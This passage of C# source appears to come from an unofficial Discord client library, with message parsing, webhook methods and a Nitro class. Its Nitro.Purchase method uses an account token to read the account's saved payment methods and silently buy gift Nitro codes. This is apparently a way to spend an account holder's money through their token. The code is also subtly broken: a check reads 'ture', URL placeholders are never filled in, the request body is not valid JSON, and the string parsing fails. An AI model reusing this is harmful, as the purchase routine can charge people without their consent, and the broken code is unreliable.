                            if (fieldValue == null) break;
                            this.editedTimeStamp = DateTime.Parse(fieldValue);
                            break;

                        case "author":
                            ulong authorId = ulong.Parse(fieldValue.Remove(fieldValue.IndexOf("\"id\":")).Remove(fieldValue.IndexOf("\",\"avatar"), fieldValue.Length));
                            this.Author = new Client.User(this.client, authorId);
                            break;

                        case "mention_roles":
                            if (fieldValue == "[]") break;
                            string[] rolesValues = fieldValue.Replace("]", "").Replace("[", "").Split(',');
                            foreach (string value in rolesValues)
                                this.MentionedRoles.Add(new Guild.Role(value.Replace("\"", "")));
                            break;

                        case "verification_level":
                            break;

                        case "max_members":
                            break;
                    }
                }
                //}
                //catch (Exception ex) { string exp = ex.Message; }
            }
        }

        public class Nitro
        {
            public enum NitroType
            {
                ClassicMonth,
                ClassicYear,
                Month,
                Year
            }

            public static void Purchase(Discord.Client client, Nitro.Get nitro, out string Result)
            {
                Result = "There is no active payment method.";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v{client.config.ApiVersion}/users/@me/billing/payment-sources");
                request.Headers.Add("Authorization", client.Token);

                string responseContent = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd();
                System.Net.HttpStatusCode responseStatusCode = ((HttpWebResponse)request.GetResponse()).StatusCode;

                if (responseStatusCode == System.Net.HttpStatusCode.OK)
                {
                    if (responseContent == "[]")
                    {
                        Result = "There is no active payment method.";
                        return;
                    }

                    if (responseContent.Contains("\"invalid\": true"))
                    {
                        Result = "There is no active payment method.";
                        return;
                    }
                    else if (responseContent.Contains("This purchase request is invalid."))
                    {
                        Result = "There is no active payment method.";
                        return;
                    }
                    else if (responseContent.Contains("\"invalid\": ture"))
                    {
                        ulong payment_source_id = ulong.Parse(responseContent.Remove(0, responseContent.IndexOf("id")).Split(':')[1]);
                        request = (HttpWebRequest)WebRequest.Create("https://discord.com/api/v{client.config.ApiVersion}/store/skus/{nitro.NitroId}/purchase");
                        StreamWriter stream = new StreamWriter(request.GetRequestStream());
                        stream.Write($"\"expected_amount\": {nitro.Amount}, \"gift\": true, \"payment_source_id\": {payment_source_id}");
                        stream.Dispose();

                        string nitroInformation = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd();
                        Result = $"discord.gift/" + nitroInformation.Remove(0, responseContent.IndexOf("gift_code")).Split(':')[1];
                        return;
                    }
                    else
                    {
                        Result = "There is no active payment method.";
                        return;
                    }
                }
            }

            public class Get
            {
                public ulong Amount;
                public ulong Id;
                public int Index;
                public string Name;

                public Get(NitroType code)
                {
                    switch (code)
                    {
                        case NitroType.ClassicMonth:
                            this.Id = Classic_Month.Id;
                            this.Name = Classic_Month.Name;
                            this.Amount = Classic_Month.Amount;
                            this.Index = 1;
                            break;

                        case NitroType.ClassicYear:
                            this.Id = Classic_Year.Id;
                            this.Name = Classic_Year.Name;
                            this.Amount = Classic_Year.Amount;
                            this.Index = 2;
                            break;

                        case NitroType.Month:
                            this.Id = Month.Id;
                            this.Name = Month.Name;
                            this.Amount = Month.Amount;
                            this.Index = 3;
                            break;

                        case NitroType.Year:
                            this.Id = Year.Id;
                            this.Name = Year.Name;
                            this.Amount = Year.Amount;
                            this.Index = 4;
                            break;

                        default:
                            this.Index = 0;
                            break;
                    }
                }
            }

            private static class Classic_Month
            {
                public static ulong Amount = 499;
                public static ulong Id = 521846918637420545;
                public static string Name = "Nitro Boost Month";
            }

            private class Classic_Year
            {
                public static ulong Amount = 4999;
                public static ulong Id = 521846918637420545;
                public static string Name = "Nitro Classic Year";
            }

            private class Month
            {
                public static ulong Amount = 999;
                public static ulong Id = 521847234246082599;
                public static string Name = "Nitro Boost Month";
            }

            private class Year
            {
                public static ulong Amount = 9999;
                public static ulong Id = 521847234246082599;
                public static string Name = "Nitro Boost Year";
            }
        }

        public class Reaction
        {
            public Reaction(string jsonObject)
            {
            }
        }

        public class Webhook
        {
            public Webhook(string url)
            {
                this.URL = url;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.ContentType = "application/json";

                try
                {
                    string responseStr = new StreamReader(((HttpWebResponse)request.GetResponse()).GetResponseStream()).ReadToEnd().Replace("}", "").Replace("{", " ");
                    string[] fields = responseStr.Split(',');
                    foreach (string field in fields)
                    {
                        int fieldLength = field.IndexOf('"', 2) - 2;
                        string fieldValue = field.Substring(field.IndexOf(':') + 2).Replace("\"", "");
                        switch (field.Substring(2, fieldLength))
                        {
                            case "id":
                                this.Id = ulong.Parse(fieldValue);
                                break;

                            case "name":
                                this.Name = fieldValue;
                                break;

                            case "avatar":
                                this.AvatarURL = string.Format("https://cdn.discordapp.com/avatars/{0}/{1}", this.Id, fieldValue);
                                break;

                            case "token":
                                this.Token = fieldValue;
                                break;

                            case "guild_id":
                                this.GuildID = ulong.Parse(fieldValue);
                                break;

                            case "channel_id":
                                this.ChannelID = ulong.Parse(fieldValue);
                                break;
                        }
                    }
                }
                catch { throw new Exception("Error while creating an object"); }
            }

            public string AvatarURL
            { get; private set; }

            public ulong ChannelID
            { get; private set; }

            public ulong GuildID
            { get; private set; }

            public ulong Id
            { get; private set; }

            public string Name
            { get; private set; }

            public string Token
            { get; private set; }

            public string URL
            { get; private set; }

            public bool Delete()
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.URL);
                request.ContentType = "application/json";
                request.Method = "DELETE";

                System.Net.HttpStatusCode code = ((HttpWebResponse)request.GetResponse()).StatusCode;

                return code == System.Net.HttpStatusCode.OK;
            }

            public void Send(Discord.Embed embed)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.URL);
                request.Headers.Set("Authorization", this.Token);
                request.ContentType = "application/json";
                request.Method = "POST";

                string message = embed.ToJsonString().Replace("\n", @"\n");
                StreamWriter streamW = new StreamWriter(request.GetRequestStream());
                streamW.Write(message);
                streamW.Dispose();
                request.GetResponse();
            }

            public void Send(string Content, bool TTS)
            {
                WebRequest webReq = WebRequest.Create(this.URL);

                webReq.ContentType = "application/json";
                webReq.Method = "POST";

                StreamWriter stream = new StreamWriter(webReq.GetRequestStream());
                stream.Write("{\"content:\"" + Content + "\", \"tts\":" + TTS.ToString() + "\"}");
                stream.Dispose();

                Thread.Sleep(50);
                webReq.GetResponse();
            }

            public void Modify(WebhookStruct options)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.URL);
                request.Headers.Add("name", options.Name);

                if (!String.IsNullOrEmpty(options.AvatarURL) && !String.IsNullOrWhiteSpace(options.AvatarURL))
                    request.Headers.Add("avatar", options.AvatarURL);
                request.Method = "PATCH";
                request.GetResponse();
            }

            public struct WebhookStruct
            {
                public string Name;
                public string AvatarURL;
            }
        }

        private static class Utils
        {
            public static int ColorToHex(Color color)
            {
                string HS =
                    color.R.ToString("X2") +
                    color.G.ToString("X2") +
                    color.B.ToString("X2");

                return int.Parse(HS, System.Globalization.NumberStyles.HexNumber);
            }
        }
    }
}